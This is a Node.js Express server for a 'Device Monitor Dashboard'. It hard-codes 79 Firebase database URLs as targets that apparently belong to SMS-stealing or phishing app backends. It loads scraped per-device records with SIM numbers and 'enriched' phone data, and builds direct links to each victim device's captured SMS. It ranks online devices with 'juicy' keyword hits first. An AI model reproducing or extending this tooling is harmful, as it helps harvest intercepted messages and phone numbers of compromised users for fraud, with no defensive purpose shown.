import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = 3000;

// ── Path to bot's working directory (where devices_database_*.json live) ──────
const BOT_DIR = process.env.BOT_DIR || '/home/ubuntu/newp';

// ── RAW_TARGETS from DA1.py ───────────────────────────────────────────────────
const RAW_TARGETS = [
  [1,'https://aartihh-dffe3-default-rtdb.firebaseio.com'],
  [2,'https://hsm2pro21-default-rtdb.firebaseio.com'],
  [3,'https://hvgvgv-abcf9-default-rtdb.firebaseio.com'],
  [4,'https://iphone-11-baab-default-rtdb.firebaseio.com/clients'],
  [5,'https://jamtar7-95f77-default-rtdb.firebaseio.com'],
  [6,'https://kubgkhbm-default-rtdb.firebaseio.com'],
  [7,'https://loda-5029e-default-rtdb.firebaseio.com/clients'],
  [8,'https://lovefimus-default-rtdb.firebaseio.com'],
  [9,'https://naxus-89796-default-rtdb.firebaseio.com'],
  [10,'https://rahul-e20c4-default-rtdb.firebaseio.com'],
  [11,'https://rahulkumat0651-87bc2-default-rtdb.firebaseio.com'],
  [12,'https://sbinew-bbc00-default-rtdb.firebaseio.com'],
  [13,'https://tillu-2-default-rtdb.firebaseio.com'],
  [14,'https://adityapanel-default-rtdb.firebaseio.com'],
  [15,'https://allinone-cf029-default-rtdb.firebaseio.com'],
  [16,'https://axis-c4bd3-default-rtdb.firebaseio.com'],
  [17,'https://backup-ec5d6-default-rtdb.firebaseio.com'],
  [18,'https://billojii-default-rtdb.firebaseio.com'],
  [19,'https://e22turnament2-default-rtdb.firebaseio.com'],
  [20,'https://fir-6b48f-default-rtdb.firebaseio.com'],
  [21,'https://h2buwhge-default-rtdb.firebaseio.com'],
  [22,'https://hello-6153b-default-rtdb.firebaseio.com'],
  [23,'https://iphone-11-baab-default-rtdb.firebaseio.com'],
  [24,'https://loda-5029e-default-rtdb.firebaseio.com'],
  [25,'https://newtan3450-default-rtdb.firebaseio.com'],
  [26,'https://noob-f1798-default-rtdb.firebaseio.com'],
  [27,'https://okayo-f1a54-default-rtdb.firebaseio.com'],
  [28,'https://proffercelawte-default-rtdb.firebaseio.com'],
  [29,'https://projectname-15100-default-rtdb.firebaseio.com'],
  [30,'https://adminpanel-5f533-default-rtdb.firebaseio.com'],
  [31,'https://admon-aeba0-default-rtdb.firebaseio.com'],
  [32,'https://challan5-default-rtdb.firebaseio.com'],
  [33,'https://human-34-kumar-default-rtdb.firebaseio.com'],
  [34,'https://mp-24jfg-default-rtdb.firebaseio.com'],
  [35,'https://nky0-a5870-default-rtdb.firebaseio.com'],
  [36,'https://nonono-q-default-rtdb.firebaseio.com'],
  [37,'https://u72328193-47b68-default-rtdb.firebaseio.com'],
  [38,'https://ai-rto-9-default-rtdb.firebaseio.com'],
  [39,'https://u72749819-fa563-default-rtdb.firebaseio.com'],
  [40,'https://ajay-33c1b-default-rtdb.firebaseio.com'],
  [41,'https://anaryef50-aa5f1-default-rtdb.firebaseio.com'],
  [42,'https://ajna-20fc4-default-rtdb.firebaseio.com'],
  [43,'https://e5turnament2-default-rtdb.firebaseio.com'],
  [44,'https://jaimahakal-42698-default-rtdb.firebaseio.com'],
  [45,'https://motb-10aae-default-rtdb.firebaseio.com'],
  [46,'https://bevhhwhbe-default-rtdb.firebaseio.com'],
  [47,'https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com'],
  [48,'https://csforme-dc64a-default-rtdb.firebaseio.com'],
  [49,'https://dogla-de225-default-rtdb.firebaseio.com'],
  [50,'https://gren-ff2af-default-rtdb.firebaseio.com'],
  [51,'https://sep12-aea6d-default-rtdb.firebaseio.com'],
  [52,'https://tt01-5e373-default-rtdb.firebaseio.com'],
  [53,'https://hjmi-5af19-default-rtdb.firebaseio.com'],
  [54,'https://jjjjjkkk-d0cc0-default-rtdb.firebaseio.com'],
  [55,'https://lalu-rama50-default-rtdb.firebaseio.com'],
  [56,'https://u24143844-c1b11-default-rtdb.firebaseio.com'],
  [57,'https://mypr-6123d-default-rtdb.firebaseio.com'],
  [58,'https://nxt11-d55d0-default-rtdb.firebaseio.com'],
  [59,'https://r62710898-39a8e-default-rtdb.firebaseio.com'],
  [60,'https://u16714964-283ef-default-rtdb.firebaseio.com'],
  [61,'https://u40179853-987df-default-rtdb.firebaseio.com'],
  [62,'https://u58325342-dffc0-default-rtdb.firebaseio.com'],
  [63,'https://u62803313-e54bc-default-rtdb.firebaseio.com'],
  [64,'https://u67583339-bf0c1-default-rtdb.firebaseio.com'],
  [65,'https://u75887828-b5a63-default-rtdb.firebaseio.com'],
  [66,'https://rahu80759-ac69b-default-rtdb.firebaseio.com'],
  [67,'https://raja252525raj-4ee9a-default-rtdb.firebaseio.com'],
  [68,'https://salasali6990-1171d-default-rtdb.firebaseio.com'],
  [69,'https://testing-81627-default-rtdb.firebaseio.com'],
  [70,'https://ranjibses-default-rtdb.firebaseio.com'],
  [71,'https://risho-d4c66-default-rtdb.firebaseio.com'],
  [72,'https://sanj-683c4-default-rtdb.firebaseio.com'],
  [73,'https://testuuu-f5cbb-default-rtdb.firebaseio.com'],
  [74,'https://u13667713-dc566-default-rtdb.firebaseio.com'],
  [75,'https://u24153206-5eef6-default-rtdb.firebaseio.com'],
  [76,'https://u25428732-91bd9-default-rtdb.firebaseio.com'],
  [77,'https://u25783858-e6739-default-rtdb.firebaseio.com'],
  [78,'https://u62751482-f5b46-default-rtdb.firebaseio.com'],
  [79,'https://u8208372-ad1d1-default-rtdb.firebaseio.com'],
];

// ── Schema assignment (mirrors DA1.py MultiTargetManager) ─────────────────────
const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73]);
const SCHEMA_3  = new Set([31,32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
const SCHEMA_4  = new Set([42,43,44,45,49,50,51,52]);
const SCHEMA_5  = new Set([58]);
const SCHEMA_6  = new Set([57]);
const SCHEMA_8A = new Set([1]);
const SCHEMA_8B = new Set([3,8,9,10,11,41]);
const SCHEMA_9  = new Set([5,12,13,40,54,59,61,62,63,64,65,70,74,75,76]);
const SCHEMA_10 = new Set([4]);
const SCHEMA_11 = new Set([7]);
const SCHEMA_12 = new Set([48]);
const SCHEMA_13 = new Set([53]);
const SCHEMA_14 = new Set([39,78]);
const SCHEMA_15 = new Set([38]);

function getSchema(id) {
  if (SCHEMA_8A.has(id)) return '8a';
  if (SCHEMA_8B.has(id)) return '8b';
  if (SCHEMA_9.has(id))  return 9;
  if (SCHEMA_10.has(id)) return 10;
  if (SCHEMA_11.has(id)) return 11;
  if (SCHEMA_12.has(id)) return 12;
  if (SCHEMA_13.has(id)) return 13;
  if (SCHEMA_14.has(id)) return 14;
  if (SCHEMA_15.has(id)) return 15;
  if (SCHEMA_2.has(id))  return 2;
  if (SCHEMA_3.has(id))  return 3;
  if (SCHEMA_4.has(id))  return 4;
  if (SCHEMA_5.has(id))  return 5;
  if (SCHEMA_6.has(id))  return 6;
  return 1;
}

// Build target list
const TARGETS = RAW_TARGETS.map(([id, url]) => ({
  id, url: url.replace(/\/$/, ''), schema: getSchema(id)
}));

// ── Helpers ───────────────────────────────────────────────────────────────────
function extract10Digits(raw) {
  if (!raw || ['N/A','Unknown','None','','null'].includes(String(raw).trim())) return '';
  const digits = String(raw).replace(/\D/g, '');
  return digits.length >= 10 ? digits.slice(-10) : '';
}

function getSmsLink(target, deviceId, objId) {
  const { url, schema } = target;
  const did = deviceId;
  if (schema === 1)    return `${url}/All_Users/sms/${did}.json?print=pretty`;
  if ([2,4,5,15,10,11].includes(schema)) return `${url}/messages/${did}.json?print=pretty`;
  if (schema === '8a' || schema === '8b') {
    const actual = (objId && objId !== 'N/A') ? objId : did;
    return `${url}/omex/All_User/Sms/${actual}.json?print=pretty`;
  }
  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${did}.json?print=pretty`;
  if (schema === 12)   return `${url}/profex_incoming/${did}.json?print=pretty`;
  if (schema === 13)   return `${url}/admin.json?print=pretty`;
  return `${url}/user_sms/${did}.json?print=pretty`;
}

function loadDb(targetId) {
  const file = path.join(BOT_DIR, `devices_database_${targetId}.json`);
  try {
    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch {}
  return {};
}

function parseLastActivity(actStr) {
  // "2026-06-14 10:08" → Date
  if (!actStr || actStr === 'Unknown') return null;
  try { return new Date(actStr); } catch { return null; }
}

function summariseTarget(target) {
  const devices = loadDb(target.id);
  const deviceList = Object.entries(devices);
  const total = deviceList.length;
  let online = 0, juicyCount = 0, withSim1 = 0, withSim2 = 0;
  let oldestActivity = null, newestActivity = null;

  for (const [, dev] of deviceList) {
    if (dev.current_status === 'online') online++;
    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
    if (extract10Digits(dev.sim1_number)) withSim1++;
    if (extract10Digits(dev.sim2_number)) withSim2++;
    const act = parseLastActivity(dev.last_activity);
    if (act) {
      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
      if (!newestActivity || act > newestActivity) newestActivity = act;
    }
  }

  return {
    id: target.id,
    url: target.url,
    schema: target.schema,
    total,
    online,
    offline: total - online,
    juicyCount,
    withSim1,
    withSim2,
    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
  };
}

// ── API routes ────────────────────────────────────────────────────────────────
app.get('/api/urls', (req, res) => {
  const summaries = TARGETS.map(t => summariseTarget(t));
  res.json(summaries);
});

app.get('/api/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });

  const devices = loadDb(id);
  const deviceList = Object.entries(devices)
    .map(([deviceId, dev]) => ({
      deviceId,
      brand:         dev.brand || 'Unknown',
      status:        dev.current_status || 'offline',
      battery:       dev.last_battery || 'N/A',
      lastActivity:  dev.last_activity || null,
      smsDate:       dev.last_activity || null,
      lastOnline:    dev.last_online || null,
      sim1:          dev.sim1_number || 'N/A',
      sim2:          dev.sim2_number || 'N/A',
      sim1Clean:     extract10Digits(dev.sim1_number),
      sim2Clean:     extract10Digits(dev.sim2_number),
      juicyKeywords: dev.juicy_keywords || [],
      appId:         dev.app_id || 'N/A',
      objId:         dev.obj_id || 'N/A',
      userSerial:    dev.user_serial || 'N/A',
      sim1Enriched:  dev.sim1_enriched || [],
      sim2Enriched:  dev.sim2_enriched || [],
      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
    }))
    .sort((a, b) => {
      // online first, then juicy, then by lastActivity desc
      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
      if (b.juicyKeywords.length !== a.juicyKeywords.length)
        return b.juicyKeywords.length - a.juicyKeywords.length;
      return 0;
    });

  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

// ── Serve frontend ────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.listen(PORT, () => {
  console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
  console.log(`Reading DB files from: ${BOT_DIR}`);
});
